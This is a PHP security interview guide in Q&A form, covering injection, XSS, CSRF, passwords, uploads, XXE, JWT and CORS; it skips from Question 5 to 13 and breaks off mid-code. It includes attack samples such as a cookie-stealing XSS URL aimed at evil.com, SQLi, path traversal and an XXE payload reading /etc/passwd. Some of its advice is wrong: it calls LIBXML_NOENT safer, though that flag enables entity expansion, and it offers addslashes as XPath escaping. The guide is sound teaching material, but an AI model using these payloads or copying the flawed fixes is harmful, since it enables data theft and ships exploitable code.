# PHP Security Best Practices

## Question 1: Explain SQL Injection and how to prevent it in PHP.

**Answer:**

SQL Injection occurs when user input is concatenated directly into SQL queries, allowing attackers to execute arbitrary SQL.

### Vulnerable Code

```php
// NEVER DO THIS!
$email = $_POST['email'];
$query = "SELECT * FROM users WHERE email = '$email'";
$result = mysqli_query($conn, $query);

// Attack: email = ' OR '1'='1
// Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1'
// Returns all users!
```

### Prevention Methods

#### 1. Prepared Statements (PDO)

```php
// PDO with named parameters
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = :email');
$stmt->execute(['email' => $email]);
$user = $stmt->fetch();

// PDO with positional parameters
$stmt = $pdo->prepare('SELECT * FROM users WHERE email = ? AND status = ?');
$stmt->execute([$email, $status]);
```

#### 2. Prepared Statements (MySQLi)

```php
$stmt = $mysqli->prepare('SELECT * FROM users WHERE email = ?');
$stmt->bind_param('s', $email);  // 's' = string, 'i' = integer, 'd' = double
$stmt->execute();
$result = $stmt->get_result();
$user = $result->fetch_assoc();
```

#### 3. Query Builder (Laravel Eloquent)

```php
// Safe - uses parameter binding
User::where('email', $email)->first();

// Also safe
DB::table('users')
    ->where('email', $email)
    ->where('status', $status)
    ->get();

// Safe raw queries with bindings
DB::select('SELECT * FROM users WHERE email = ?', [$email]);
DB::select('SELECT * FROM users WHERE email = :email', ['email' => $email]);
```

#### 4. Dangerous: Raw Queries

```php
// DANGEROUS if $email is not sanitized
DB::raw("SELECT * FROM users WHERE email = '$email'");

// Safe way to use DB::raw
DB::table('users')
    ->whereRaw('email = ?', [$email])
    ->get();
```

### Input Validation

```php
// Always validate input
$email = filter_input(INPUT_POST, 'email', FILTER_VALIDATE_EMAIL);
if (!$email) {
    throw new InvalidArgumentException('Invalid email');
}

// Whitelist allowed values
$allowedStatuses = ['active', 'pending', 'suspended'];
if (!in_array($status, $allowedStatuses, true)) {
    throw new InvalidArgumentException('Invalid status');
}
```

**Follow-up:**
- What is second-order SQL injection?
- Can you use prepared statements for table/column names?
- How do ORMs prevent SQL injection?

**Key Points:**
- Never concatenate user input into SQL
- Always use prepared statements
- Validate and sanitize all input
- Use ORM query builders when possible
- Whitelist allowed values

---

## Question 2: How do you prevent XSS (Cross-Site Scripting) attacks?

**Answer:**

XSS occurs when user-supplied data is rendered in HTML without proper escaping.

### Types of XSS

#### 1. Stored XSS (Persistent)

```php
// Vulnerable: Stored in database, executed when displayed
$comment = $_POST['comment'];
DB::table('comments')->insert(['content' => $comment]);

// Later, displaying:
echo $comment;  // DANGER: <script>alert('XSS')</script>
```

#### 2. Reflected XSS

```php
// Vulnerable: Immediately reflected
$search = $_GET['q'];
echo "You searched for: $search";  // DANGER

// Attack URL: /?q=<script>document.location='http://evil.com?c='+document.cookie</script>
```

#### 3. DOM-based XSS
```javascript
// Vulnerable JavaScript
let param = location.hash.substring(1);
document.getElementById('output').innerHTML = param;  // DANGER
```

### Prevention

#### 1. Output Escaping

```php
// PHP native functions
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');

// Laravel Blade (auto-escapes)
{{ $userInput }}  // Safe - auto-escaped

// Raw output (dangerous)
{!! $userInput !!}  // DANGER - use only for trusted HTML

// JavaScript context
<script>
    let name = <?php echo json_encode($name, JSON_HEX_TAG | JSON_HEX_AMP); ?>;
</script>
```

#### 2. Content Security Policy (CSP)

```php
// Set CSP headers
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-{$nonce}'");

// Laravel middleware
class ContentSecurityPolicy {
    public function handle($request, $next) {
        $response = $next($request);
        $response->headers->set('Content-Security-Policy',
            "default-src 'self'; script-src 'self' 'unsafe-inline' https://cdn.example.com"
        );
        return $response;
    }
}
```

#### 3. Input Sanitization

```php
// Remove HTML tags
$clean = strip_tags($userInput);

// Allow specific tags
$clean = strip_tags($userInput, '<p><br><strong><em>');

// Use HTML Purifier for rich text
use HTMLPurifier;

$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean = $purifier->purify($userInput);
```

#### 4. Context-Aware Escaping

```php
// HTML context
echo htmlspecialchars($data);

// HTML attribute
echo '<div data-value="' . htmlspecialchars($data, ENT_QUOTES) . '">';

// JavaScript context
echo '<script>let data = ' . json_encode($data) . ';</script>';

// URL context
echo '<a href="' . urlencode($data) . '">';

// CSS context (avoid user input in CSS!)
```

**Follow-up:**
- What is the difference between stored and reflected XSS?
- Can CSP completely prevent XSS?
- How do you safely render user-generated HTML?

**Key Points:**
- Escape all output: `htmlspecialchars()` or Blade `{{ }}`
- Implement Content Security Policy
- Sanitize input with HTML Purifier for rich text
- Never use `innerHTML` with user data
- Context matters: HTML, JS, URL need different escaping

---

## Question 3: How do you protect against CSRF (Cross-Site Request Forgery)?

**Answer:**

CSRF tricks authenticated users into executing unwanted actions.

### Attack Example

```html
<!-- Attacker's site -->
<img src="https://yourbank.com/transfer?to=attacker&amount=1000" />

<!-- If user is logged in to yourbank.com, request succeeds! -->
```

### Prevention

#### 1. CSRF Tokens

```php
// Generate token (Laravel does this automatically)
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Include in forms
<form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="<?= $_SESSION['csrf_token'] ?>">
    <!-- form fields -->
</form>

// Verify token
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    throw new Exception('CSRF token mismatch');
}
```

#### 2. Laravel CSRF Protection

```php
// Automatic in Blade
<form method="POST" action="/profile">
    @csrf
    <!-- form fields -->
</form>

// AJAX with Axios (Laravel sets X-CSRF-TOKEN header automatically)
axios.post('/api/users', data);

// Manual AJAX
<meta name="csrf-token" content="{{ csrf_token() }}">

<script>
$.ajaxSetup({
    headers: {
        'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
    }
});
</script>

// Exclude routes from CSRF (API routes)
// app/Http/Middleware/VerifyCsrfToken.php
protected $except = [
    'webhook/*',
    'api/*'
];
```

#### 3. SameSite Cookies

```php
// config/session.php
'same_site' => 'strict',  // or 'lax'

// Set cookie with SameSite
setcookie('session', $value, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'  // Strict, Lax, or None
]);
```

#### 4. Double Submit Cookie

```php
// Alternative to session-based tokens
// Set cookie with token
setcookie('csrf_token', $token, ['httponly' => false]);  // JS needs to read it

// Include same token in request
// Compare cookie token with request token
if ($_COOKIE['csrf_token'] !== $_POST['csrf_token']) {
    throw new Exception('CSRF token mismatch');
}
```

#### 5. Referer/Origin Header Validation

```php
// Validate request origin
$allowedOrigins = ['https://example.com', 'https://www.example.com'];
$origin = $_SERVER['HTTP_ORIGIN'] ?? '';

if (!in_array($origin, $allowedOrigins, true)) {
    throw new Exception('Invalid origin');
}

// Check referer (less reliable, can be spoofed)
$referer = $_SERVER['HTTP_REFERER'] ?? '';
if (!str_starts_with($referer, 'https://example.com')) {
    throw new Exception('Invalid referer');
}
```

**Follow-up:**
- What is the difference between Strict and Lax SameSite?
- Can CSRF tokens be stored in localStorage?
- How do you handle CSRF for APIs?

**Key Points:**
- Always use CSRF tokens for state-changing requests
- Laravel includes CSRF protection by default
- Use SameSite cookies (Strict or Lax)
- Validate Origin/Referer headers
- APIs use token-based auth (not session-based)

---

## Question 4: How do you securely handle authentication and passwords?

**Answer:**

### Password Hashing

```php
// NEVER store plaintext passwords!
// NEVER use MD5 or SHA1 for passwords!

// Good: Use password_hash() (bcrypt)
$hash = password_hash($password, PASSWORD_BCRYPT);

// Better: Use PASSWORD_DEFAULT (argon2id in PHP 8.2+)
$hash = password_hash($password, PASSWORD_DEFAULT);

// Verify password
if (password_verify($password, $hash)) {
    // Password correct
}

// Rehash if needed (e.g., algorithm changed)
if (password_needs_rehash($hash, PASSWORD_DEFAULT)) {
    $newHash = password_hash($password, PASSWORD_DEFAULT);
    // Update database
}

// Custom cost factor (higher = more secure, slower)
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
```

### Secure Session Handling

```php
// Session configuration
ini_set('session.cookie_httponly', 1);  // Prevent JS access
ini_set('session.cookie_secure', 1);    // HTTPS only
ini_set('session.cookie_samesite', 'Strict');
ini_set('session.use_strict_mode', 1);  // Reject uninitialized session IDs

// Regenerate session ID on login
session_start();
if ($user->login($email, $password)) {
    session_regenerate_id(true);  // Prevent session fixation
    $_SESSION['user_id'] = $user->id;
}

// Logout: Destroy session
session_start();
$_SESSION = [];
session_destroy();
setcookie(session_name(), '', time() - 3600, '/');
```

### Multi-Factor Authentication

```php
use PragmaRX\Google2FA\Google2FA;

// Generate secret
$google2fa = new Google2FA();
$secret = $google2fa->generateSecretKey();

// Store $secret for user

// Verify OTP
$otp = $_POST['otp'];
$valid = $google2fa->verifyKey($secret, $otp);

if ($valid) {
    // OTP correct
}
```

### Rate Limiting Login Attempts

```php
use Illuminate\Support\Facades\RateLimiter;

// Throttle login attempts
$executed = RateLimiter::attempt(
    'login:' . $request->ip(),
    5,  // Max 5 attempts
    function() use ($credentials) {
        return Auth::attempt($credentials);
    },
    60  // Per 60 seconds
);

if (!$executed) {
    throw new TooManyRequestsException('Too many login attempts');
}

// Manual rate limiting
$key = 'login:' . $request->ip();
$attempts = RateLimiter::attempts($key);

if ($attempts >= 5) {
    $seconds = RateLimiter::availableIn($key);
    throw new TooManyRequestsException("Try again in {$seconds} seconds");
}

RateLimiter::hit($key, 60);  // Increment, expires in 60 seconds
```

### Account Lockout

```php
class User {
    public function recordFailedLogin(): void {
        $this->failed_login_attempts++;

        if ($this->failed_login_attempts >= 5) {
            $this->locked_until = now()->addMinutes(30);
        }

        $this->save();
    }

    public function isLocked(): bool {
        return $this->locked_until && $this->locked_until->isFuture();
    }

    public function recordSuccessfulLogin(): void {
        $this->failed_login_attempts = 0;
        $this->locked_until = null;
        $this->last_login = now();
        $this->save();
    }
}
```

### Remember Me Tokens

```php
// NEVER store "remember_me" as boolean in session!
// Use secure token-based approach

class User {
    public function generateRememberToken(): string {
        $token = bin2hex(random_bytes(32));
        $this->remember_token = hash('sha256', $token);
        $this->save();
        return $token;
    }

    public static function findByRememberToken(string $token): ?User {
        $hashedToken = hash('sha256', $token);
        return static::where('remember_token', $hashedToken)->first();
    }
}

// Set cookie
setcookie('remember_token', $token, time() + (86400 * 30), '/', '', true, true);
```

**Follow-up:**
- Why shouldn't you use MD5 for passwords?
- What is session fixation?
- Explain timing attacks on password verification

**Key Points:**
- Use `password_hash()` with PASSWORD_DEFAULT
- Never store plaintext passwords
- Regenerate session ID after login
- Implement rate limiting and account lockout
- Use secure cookies (HttpOnly, Secure, SameSite)
- Consider MFA for sensitive applications

---

## Question 5: How do you prevent directory traversal and file upload vulnerabilities?

**Answer:**

### Directory Traversal

```php
// Vulnerable code
$file = $_GET['file'];
include("/var/www/pages/" . $file);
// Attack: ?file=../../../../etc/passwd

// Prevention 1: Whitelist allowed files
$allowedFiles = ['home', 'about', 'contact'];
$file = $_GET['file'];

if (!in_array($file, $allowedFiles, true)) {
    throw new Exception('Invalid file');
}

include("/var/www/pages/{$file}.php");

// Prevention 2: Validate path
function isPathSafe(string $basePath, string $userPath): bool {
    $realBase = realpath($basePath);
    $realUser = realpath($basePath . '/' . $userPath);

    // Check if user path is within base directory
    return $realUser !== false && str_starts_with($realUser, $realBase);
}

$basePath = '/var/www/pages';
$requestedFile = $_GET['file'];

if (!isPathSafe($basePath, $requestedFile)) {
    throw new Exception('Invalid file path');
}

include($basePath . '/' . $requestedFile);

// Prevention 3: Strip dangerous characters
$file = basename($_GET['file']);  // Removes directory traversal
$file = preg_replace('/[^a-zA-Z0-9_-]/', '', $file);  // Whitelist characters
```

### File Upload Vulnerabilities

```php
// Validate file uploads
function validateUpload(array $file): void {
    // 1. Check for upload errors
    if ($file['error'] !== UPLOAD_ERR_OK) {
        throw new Exception('Upload failed');
    }

    // 2. Validate file size
    $maxSize = 5 * 1024 * 1024;  // 5MB
    if ($file['size'] > $maxSize) {
        throw new Exception('File too large');
    }

    // 3. Validate MIME type (check actual content, not extension)
    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif'];
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mimeType = finfo_file($finfo, $file['tmp_name']);
    finfo_close($finfo);

    if (!in_array($mimeType, $allowedMimes, true)) {
        throw new Exception('Invalid file type');
    }

    // 4. Validate file extension
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif'];
    $extension = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));

    if (!in_array($extension, $allowedExtensions, true)) {
        throw new Exception('Invalid file extension');
    }

    // 5. Validate file content (for images)
    if (!getimagesize($file['tmp_name'])) {
        throw new Exception('Invalid image file');
    }
}

// Safe file upload
if ($_FILES['upload']) {
    $file = $_FILES['upload'];

    try {
        validateUpload($file);

        // Generate safe filename
        $extension = pathinfo($file['name'], PATHINFO_EXTENSION);
        $filename = bin2hex(random_bytes(16)) . '.' . $extension;

        // Store outside web root or with .htaccess protection
        $uploadDir = '/var/www/uploads/';  // Outside public directory
        $destination = $uploadDir . $filename;

        if (!move_uploaded_file($file['tmp_name'], $destination)) {
            throw new Exception('Failed to save file');
        }

        // Store metadata in database
        DB::table('uploads')->insert([
            'original_name' => basename($file['name']),
            'stored_name' => $filename,
            'mime_type' => $mimeType,
            'size' => $file['size'],
            'user_id' => Auth::id()
        ]);

    } catch (Exception $e) {
        // Handle error
    }
}
```

### Laravel File Upload

```php
// Validation
$request->validate([
    'avatar' => 'required|image|mimes:jpg,png|max:2048',  // Max 2MB
    'document' => 'required|file|mimes:pdf,doc,docx|max:10240'
]);

// Store file
$path = $request->file('avatar')->store('avatars', 'public');

// Store with custom name
$filename = uniqid() . '.' . $request->file('avatar')->extension();
$path = $request->file('avatar')->storeAs('avatars', $filename, 'public');

// Store on S3
$path = $request->file('document')->store('documents', 's3');
```

### Secure File Serving

```php
// NEVER directly expose upload directory!
// Use controller to serve files

public function download(string $fileId) {
    $file = DB::table('uploads')->find($fileId);

    // Check permission
    if ($file->user_id !== Auth::id()) {
        abort(403);
    }

    $path = storage_path('uploads/' . $file->stored_name);

    if (!file_exists($path)) {
        abort(404);
    }

    return response()->download($path, $file->original_name);
}
```

### .htaccess Protection

```apache
# In upload directory
<FilesMatch "\.php$">
    Deny from all
</FilesMatch>

# Or deny all execution
Options -ExecCGI
AddHandler cgi-script .php .pl .py .jsp .asp .sh .cgi
```

**Follow-up:**
- How can attackers bypass MIME type checks?
- What is a null byte injection?
- How do you scan uploads for malware?

**Key Points:**
- Validate file type by content, not extension
- Generate random filenames
- Store uploads outside web root
- Check file permissions before serving
- Use Laravel's validation and storage
- Never trust user-provided filenames

---

## Question 13: How do you parse XML data in PHP? What issues should developers consider?

**Answer:**

XML parsing in PHP requires careful handling for security, performance, and data integrity.

### XML Parsing Methods in PHP

```php
<?php
// 1. SimpleXML - Easy to use, good for most cases
$xml = simplexml_load_string($xmlString);
echo $xml->user->name;  // Access elements
echo $xml->user['id'];  // Access attributes

// 2. DOMDocument - Full control, complex documents
$doc = new DOMDocument();
$doc->loadXML($xmlString);
$users = $doc->getElementsByTagName('user');
foreach ($users as $user) {
    echo $user->nodeValue;
}

// 3. XMLReader - Memory efficient, large files
$reader = new XMLReader();
$reader->xml($xmlString);
while ($reader->read()) {
    if ($reader->nodeType === XMLReader::ELEMENT && $reader->name === 'user') {
        // Process element
    }
}

// 4. XMLWriter - Creating XML
$writer = new XMLWriter();
$writer->openMemory();
$writer->startDocument('1.0', 'UTF-8');
$writer->startElement('users');
$writer->startElement('user');
$writer->writeAttribute('id', '1');
$writer->writeElement('name', 'John');
$writer->endElement();
$writer->endElement();
echo $writer->outputMemory();
```

### Security: Preventing XXE Attacks

```php
<?php
// ❌ Dangerous: Allows XXE attacks
$xml = simplexml_load_string($input);
// Attacker can include:
// <?xml version="1.0"?>
// <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
// <data>&xxe;</data>

// ✅ Safe: Disable external entities
libxml_disable_entity_loader(true);  // PHP 5.2.10+

// ✅ Safer: Use constants
$xml = simplexml_load_string($input, 'SimpleXMLElement', LIBXML_NOENT);
// Or with DOM:
$doc = new DOMDocument();
$doc->substituteEntities = false;
$doc->loadXML($input, LIBXML_NOENT);

// ✅ Best: Custom entity loader (PHP 7.2+)
libxml_set_external_entity_loader(function ($public, $system, $context) {
    // Only allow specific URIs
    if (in_array($system, ['http://example.com/schema.dtd'])) {
        return fopen($system, 'r');
    }
    return null;
});

// Laravel validation for XML
class ValidateXml
{
    public function validate(string $xml): bool
    {
        $internalErrors = libxml_use_internal_errors();
        
        try {
            $doc = new SimpleXMLElement($xml);
            
            // Disable external entities
            libxml_disable_entity_loader(true);
            
            return true;
        } catch (\Exception $e) {
            return false;
        } finally {
            libxml_use_internal_errors($internalErrors);
        }
    }
}
```

### Common XML Parsing Issues

```php
<?php
// 1. Large File Processing - Memory Issues
// ❌ Bad: Loads entire file into memory
$xml = simplexml_load_file('large.xml');

// ✅ Good: Use XMLReader for streaming
$reader = new XMLReader();
$reader->open('large.xml');
while ($reader->read()) {
    if ($reader->nodeType === XMLReader::ELEMENT && $reader->name === 'item') {
        $node = simplexml_load_string($reader->readOuterXML());
        $this->processItem($node);
    }
}

// 2. Encoding Issues
// ❌ Bad: Assume UTF-8
$xml = simplexml_load_string($input);

// ✅ Good: Handle encoding properly
$xml = simplexml_load_string($input, 'SimpleXMLElement', 0, 'UTF-8');

// Convert to UTF-8 if needed
function convertToUtf8(string $data): string
{
    $encoding = mb_detect_encoding($data, ['UTF-8', 'ISO-8859-1', 'Windows-1252'], true);
    return $encoding === 'UTF-8' ? $data : mb_convert_encoding($data, 'UTF-8', $encoding);
}

// 3. Invalid XML Handling
// ✅ Good: Proper error handling
function safeParseXml(string $xml): ?SimpleXMLElement
{
    $internalErrors = libxml_use_internal_errors(true);
    
    $xmlElement = simplexml_load_string($xml);
    
    if ($xmlElement === false) {
        $errors = libxml_get_errors();
        foreach ($errors as $error) {
            Log::warning('XML Parse Error', [
                'message' => $error->message,
                'line' => $error->line,
                'column' => $error->column,
            ]);
        }
        libxml_clear_errors();
        return null;
    }
    
    libxml_use_internal_errors($internalErrors);
    return $xmlElement;
}

// 4. XPath Injection
// ❌ Bad: Direct user input in XPath
$xpath = "/users/user[name='$name']";  // Injection possible!

// ✅ Good: Use prepared statements or escape
$xpath = "/users/user[name='" . addslashes($name) . "']";

// ✅ Better: Use parameters where supported
$xml = simplexml_load_string($xmlString);
$result = $xml->xpath("//user[@id='" . intval($userId) . "']");
```

### Parsing XML with Namespaces

```php
<?php
$xmlString = <<<XML
<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <entry>
        <id>1</id>
        <title type="text">Hello</title>
        <author><name>John</name></author>
    </entry>
</feed>
XML;

// With SimpleXML - handle namespaces
$xml = simplexml_load_string($xmlString);

// Register namespace
$xml->registerXPathNamespace('atom', 'http://www.w3.org/2005/Atom');
$entries = $xml->xpath('//atom:entry');

foreach ($entries as $entry) {
    echo $entry->title;
    echo $entry->author->name;
}

// With DOM - handle namespaces
$doc = new DOMDocument();
$doc->loadXML($xmlString);
$xpath = new DOMXPath($doc);
$xpath->registerNamespace('atom', 'http://www.w3.org/2005/Atom');
$entries = $xpath->query('//atom:entry');

foreach ($entries as $entry) {
    echo $entry->getElementsByTagNameNS('http://www.w3.org/2005/Atom', 'title')->item(0)->nodeValue;
}
```

### XML to Array Conversion

```php
<?php
function xmlToArray(SimpleXMLElement $xml): array
{
    $result = [];
    
    // Get attributes
    foreach ($xml->attributes() as $attr => $value) {
        $result['@attributes'][$attr] = (string) $value;
    }
    
    // Get children
    foreach ($xml->children() as $childName => $child) {
        if (!isset($result[$childName])) {
            $result[$childName] = [];
        }
        $result[$childName][] = xmlToArray($child);
    }
    
    // Get text content
    $text = trim((string) $xml);
    if (empty($result)) {
        return $text;
    }
    
    // Add text content if exists
    if ($text !== '') {
        $result['@text'] = $text;
    }
    
    return $result;
}

// Usage
$xml = simplexml_load_string($xmlString);
$array = xmlToArray($xml);
```

### Performance Considerations

```php
<?php
// 1. Cache parsed XML
class XmlCache
{
    private Cache $cache;
    
    public function parse(string $xml, int $ttl = 3600): SimpleXMLElement
    {
        $hash = md5($xml);
        
        return $this->cache->remember("xml:{$hash}", $ttl, function () use ($xml) {
            return simplexml_load_string($xml);
        });
    }
}

// 2. Incremental parsing for huge files
class LargeXmlParser
{
    public function process(string $filePath, callable $callback): void
    {
        $reader = new XMLReader();
        
        if (!$reader->open($filePath)) {
            throw new RuntimeException("Cannot open XML file");
        }
        
        while ($reader->read()) {
            if ($reader->nodeType === XMLReader::ELEMENT && $reader->name === 'record') {
                $node = simplexml_load_string($reader->readOuterXML());
                $callback($node);
                
                // Free memory
                unset($node);
            }
        }
        
        $reader->close();
    }
}

// Usage
$parser = new LargeXmlParser();
$parser->process('data.xml', function ($record) {
    // Process each record individually
    $this->save($record);
});
```

### Best Practices

```php
<?php
// ✅ Always disable entity loading for untrusted XML
libxml_disable_entity_loader(true);

// ✅ Validate XML against schema
function validateXml(string $xml, string $schemaPath): bool
{
    $doc = new DOMDocument();
    $doc->loadXML($xml);
    
    return $doc->schemaValidate($schemaPath);
}

// ✅ Use whitelist approach for parsing
class SecureXmlParser
{
    private array $allowedTags = ['user', 'name', 'email', 'age'];
    
    public function parse(string $xml): array
    {
        $xml = simplexml_load_string($xml);
        $result = [];
        
        foreach ($xml->children() as $element) {
            if (in_array($element->getName(), $this->allowedTags)) {
                $result[$element->getName()] = (string) $element;
            }
        }
        
        return $result;
    }
}

// ✅ Handle encoding properly
function parseXmlWithEncoding(string $xml): ?SimpleXMLElement
{
    // Detect and convert encoding
    $encoding = mb_detect_encoding($xml, ['UTF-8', 'ISO-8859-1', 'Windows-1252'], true);
    
    if ($encoding && $encoding !== 'UTF-8') {
        $xml = mb_convert_encoding($xml, 'UTF-8', $encoding);
    }
    
    return simplexml_load_string($xml);
}

// ❌ Don't use eval() or similar with XML data
// ❌ Don't display raw XML errors to users
// ❌ Don't trust XML from external sources without validation
```

**Key Points:**
- Use `libxml_disable_entity_loader(true)` to prevent XXE
- Use XMLReader for large files (streaming)
- Handle encoding properly (UTF-8 vs others)
- Validate against XSD/schema
- Use XPath carefully to prevent injection
- Convert XML to array for easier processing
- Cache parsed XML when possible
- Handle errors gracefully

---

## Question 14: How does JWT guarantee security? Where is it stored and why is it difficult to replace?

**Answer:**

JWT (JSON Web Token) is a compact, URL-safe token format for securely transmitting claims between parties.

### JWT Structure

```
┌─────────────────────────────────────────────────────────────┐
│ JWT = Header.Payload.Signature                              │
├─────────────────────────────────────────────────────────────┤
│ Header:                                                     │
│ { "alg": "HS256", "typ": "JWT" }                          │
│                                                             │
│ Payload (Claims):                                           │
│ {                                                           │
│   "sub": "1234567890",      // Subject (user ID)          │
│   "name": "John Doe",       // Custom claims              │
│   "admin": true,            // Custom claims              │
│   "iat": 1516239022,       // Issued at                  │
│   "exp": 1516242622        // Expiration                  │
│ }                                                           │
│                                                             │
│ Signature:                                                   │
│ HMACSHA256(                                                │
│   base64UrlEncode(header) + "." + base64UrlEncode(payload),│
│   secret_key                                                │
│ )                                                           │
└─────────────────────────────────────────────────────────────┘
```

### How JWT Guarantees Security

```php
<?php
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

// 1. Signature Verification
class JWTService
{
    private string $secretKey;
    
    public function __construct(string $secretKey)
    {
        $this->secretKey = $secretKey;
    }
    
    public function createToken(User $user): string
    {
        $payload = [
            'iss' => config('app.url'),           // Issuer
            'sub' => $user->id,                   // Subject (user ID)
            'iat' => time(),                       // Issued at
            'exp' => time() + 3600,               // Expiration (1 hour)
            'user' => [
                'email' => $user->email,
                'role' => $user->role,
            ],
        ];
        
        // Sign with algorithm - ensures integrity
        return JWT::encode($payload, $this->secretKey, 'HS256');
    }
    
    public function verifyToken(string $token): ?object
    {
        try {
            // Verify signature - guarantees token wasn't tampered
            return JWT::decode($token, new Key($this->secretKey, 'HS256'));
        } catch (\Exception $e) {
            return null;  // Invalid token
        }
    }
}
```

### Security Properties of JWT

```php
<?php
// JWT Security Guarantees:
// 1. Authentication - Who you are (sub claim)
// 2. Integrity - Can't be tampered (signature)
// 3. Non-repudiation - Issued by trusted party (iss claim)
// 4. Optional encryption (JWE - JSON Web Encryption)

// Algorithm Security
// ✅ Good: Strong algorithms
$payload = ['sub' => '123'];

// HS256 - HMAC with SHA-256 (symmetric)
JWT::encode($payload, $secretKey, 'HS256');

// RS256 - RSA Signature with SHA-256 (asymmetric)
// Uses private key to sign, public key to verify
$privateKey = openssl_pkey_get_private('file://private.pem');
JWT::encode($payload, $privateKey, 'RS256');

// ❌ Bad: "none" algorithm (disabled in libraries)
JWT::encode($payload, 'secret', 'none');  // Will fail in libraries!

// ❌ Bad: Weak algorithms (HS256 with short keys)
// Should use at least 256-bit keys
```

### JWT Storage: Client-Side vs Server-Side

```php
<?php
// Option 1: LocalStorage (Web)
// ✅ Good: Easy to implement
// ❌ Bad: Vulnerable to XSS attacks

// Client stores token
localStorage.setItem('token', jwtToken);

// Attacker with XSS can steal:
localStorage.getItem('token');

// Option 2: HttpOnly Cookies
// ✅ Good: Protected from XSS
// ❌ Bad: Vulnerable to CSRF

// Server sets cookie (with flags)
response()->cookie(
    'token', 
    $token, 
    120,           // minutes
    '/',           // path
    null,          // domain
    true,          // secure (HTTPS only)
    true           // httpOnly (not accessible to JS)
);

// Option 3: Memory (JavaScript variables)
// ✅ Good: Protected from XSS (token not persisted)
// ❌ Bad: Token lost on page refresh, doesn't survive browser close

// Best Practice: Dual Token Strategy
class AuthService
{
    public function login(string $email, string $password): array
    {
        $user = $this->verifyCredentials($email, $password);
        
        // Short-lived access token (15 min)
        $accessToken = $this->createAccessToken($user);
        
        // Long-lived refresh token (7 days, in HttpOnly cookie)
        $refreshToken = $this->createRefreshToken($user);
        
        return [
            'access_token' => $accessToken,
            'token_type' => 'Bearer',
            'expires_in' => 900,
        ];
    }
}
```

### Why JWT is Difficult to Replace (Revocation)

```php
<?php
// The Problem: JWT is self-contained
// Server doesn't store token state
// Token valid until expiration

// ❌ Can't simply "logout" (token still valid)
Auth::logout();  // User's token still works until expiration!

// Solutions for JWT Revocation:

// 1. Short expiration (mitigation, not solution)
$payload = ['exp' => time() + 300];  // 5 minutes

// 2. Token blacklist (defeats JWT purpose somewhat)
class JWTBlacklist
{
    private Redis $redis;
    
    public function revoke(string $token): void
    {
        $decoded = JWT::decode($token, new Key($this->secret, 'HS256'));
        $this->redis->setex(
            "blacklist:{$decoded->jti}",
            $decoded->exp - time(),
            'revoked'
        );
    }
    
    public function isRevoked(string $token): bool
    {
        $decoded = JWT::decode($token, new Key($this->secret, 'HS256'));
        return $this->redis->exists("blacklist:{$decoded->jti}");
    }
}

// 3. Use refresh tokens (recommended approach)
class RefreshTokenStrategy
{
    // On logout, just remove refresh token
    // Access token expires quickly anyway
    public function logout(): void
    {
        // Delete refresh token from database/Redis
        $this->refreshTokenRepo->delete($this->getRefreshTokenFromCookie());
    }
}
```

### Security Best Practices

```php
<?php
// ✅ Always verify signature
$decoded = JWT::decode($token, new Key($secret, 'HS256'));

// ✅ Check expiration - built into JWT::decode()

// ✅ Validate issuer and audience
JWT::decode($token, new Key($secret, 'HS256'));

// ✅ Use strong secret keys (min 256 bits)
$secret = bin2hex(random_bytes(32));  // 256-bit random key

// ✅ Use short expiration for access tokens
$payload['exp'] = time() + 900;  // 15 minutes

// ✅ Use RS256 for public APIs (asymmetric)

// ✅ Include unique identifier (jti) for tracking

// ✅ Implement token refresh mechanism

// ❌ Don't store sensitive data in JWT (visible in payload)
// JWT payload is encoded, NOT encrypted

// ❌ Don't trust token content for authorization
// Always verify user still exists and has permissions
```

**Key Points:**
- JWT signature guarantees integrity (can't tamper)
- Stored in: LocalStorage (XSS vulnerable), HttpOnly cookies (CSRF vulnerable)
- Difficult to replace because: stateless, no server-side storage
- Solutions: short expiry, refresh tokens, blacklist
- Best practice: short-lived access + long-lived refresh tokens
- Never store sensitive data in JWT payload
- Use RS256 for public APIs

---

---

## Question 15: Where and how is CORS checked?

**Answer:**

CORS (Cross-Origin Resource Sharing) is checked at the browser level. The browser sends an HTTP request and checks the response headers to determine if the request should be allowed or blocked.

### CORS Flow

```
┌─────────────────────────────────────────────────────────────────┐
│                     CORS Request Flow                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  1. Browser sends OPTIONS (preflight) for non-simple requests   │
│                            ↓                                     │
│  2. Server checks Origin against allowed origins                │
│                            ↓                                     │
│  3. Server responds with CORS headers                          │
│                            ↓                                     │
│  4. Browser validates headers                                   │
│                            ↓                                     │
│  5. If valid, sends actual request                             │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

### Simple vs Non-Simple Requests

```http
<!-- Simple request - no preflight -->
GET /api/users
Origin: https://app.example.com
Method: GET, HEAD, POST
Headers: Accept, Accept-Language, Content-Language, Content-Type (only specific)

<!-- Non-Simple request - preflight required -->
PUT /api/users
Origin: https://app.example.com
Content-Type: application/json
```

### Server-Side CORS Implementation

#### PHP Native Implementation

```php
<?php
// Middleware-like implementation
class CorsMiddleware
{
    public function handle(): void
    {
        $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
        $allowedOrigins = ['https://app.example.com', 'https://admin.example.com'];
        
        // Allow specific origins
        if (in_array($origin, $allowedOrigins, true)) {
            header("Access-Control-Allow-Origin: {$origin}");
        }
        
        // Or allow all (for development)
        // header("Access-Control-Allow-Origin: *");
        
        // Allow credentials
